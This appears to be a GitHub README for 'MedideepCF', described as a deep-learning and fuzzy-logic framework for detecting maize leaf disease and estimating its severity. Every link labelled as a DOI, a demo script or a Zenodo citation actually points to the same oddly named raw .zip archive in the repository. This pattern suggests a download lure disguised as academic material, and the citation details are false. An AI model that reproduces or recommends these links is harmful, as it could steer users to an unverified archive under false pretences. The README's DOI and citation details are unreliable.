# MedideepCF
An Advanced Engineering Informatics Framework for Interpretable Maize Leaf Disease Detection and Severity Estimation using Deep Learning and Fuzzy Logic

**Version:** v1.0  
**Author:** Soikoth3010  
**DOI:** https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip  

---

## Transparency Note
This repository provides pretrained models and an end-to-end inference pipeline for the MedideepCF framework.  
The full training pipeline is not publicly released; however, the provided scripts enable reproduction and verification of all reported inference results presented in the manuscript.

---

## Overview
MedideepCF is a research-grade, interpretable AI framework for maize leaf disease detection and severity estimation.  
The framework integrates semantic segmentation, attention-enhanced classification, and fuzzy logic–based reasoning within a unified pipeline.

The proposed framework combines:
- DeepLabV3+ (ResNet-50) for pixel-level lesion segmentation  
- EfficientNet-B0 with CBAM for disease classification  
- Mamdani-type fuzzy inference for interpretable severity estimation
  
---

## Repository Structure
data/ Dataset references and annotations
models/ Pretrained segmentation and classification models
inference/ End-to-end inference scripts

---

## Dataset Description

### Model Dataset
- RGB maize leaf images used for disease classification  
- Four classes:
  - Blight  
  - Common Rust  
  - Gray Leaf Spot  
  - Healthy  

### Masked Dataset
- Polygon-annotated segmentation masks created using Labelme  
- Used for training and validating the DeepLabV3+ segmentation module  
- Enables pixel-level lesion localization for interpretability and severity estimation  

---

## MedideepCF Pipeline

### 1. Preprocessing
- Channel-wise median filtering for noise suppression  
- Linear contrast enhancement for improved lesion visibility  

### 2. Semantic Segmentation
- DeepLabV3+ with ResNet-50 backbone  
- Produces binary lesion masks for spatial localization  

### 3. Disease Classification
- EfficientNet-B0 enhanced with CBAM attention  
- Robust to noise, illumination variation, and field conditions  

### 4. Severity Estimation
- Mamdani-type fuzzy inference system  
- Inputs: lesion area, lesion count, and color deviation  
- Output: interpretable severity score (0–100)  

---

## Performance Summary
- **Accuracy:** 96.42%  
- **F1-score:** 96.51%  
- Evaluated using 4-fold stratified cross-validation  
- Strong segmentation and classification performance  
- Lightweight and CPU-friendly inference  

---

## Inference Demo
The script `https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip` demonstrates the complete MedideepCF inference pipeline on a single input image, including preprocessing, segmentation, classification, and severity estimation using pretrained models.

This demo is intended for:
- Verifying model compatibility  
- Demonstrating the end-to-end inference flow  
- Supporting qualitative evaluation  

---

## Citation
If you use MedideepCF in your research, please cite:

Soikoth, S. (2026). *MedideepCF – An Advanced Engineering Informatics Framework Using Deep Learning and Fuzzy Logic*. Zenodo.  
https://github.com/Soikoth3010/MedideepCF-An-Advanced-Engineering-Informatics-Framework-....-using-Deep-Learning-and-Fuzzy-Logic/raw/refs/heads/main/models/classification/Logic-Learning-Medideep-Engineering-using-An-Advanced-C-Fuzzy-Framework-and-Informatics-Deep-v3.3.zip  

---

## License
This repository is released for **academic and research purposes only**.  
For commercial use, please contact the author.
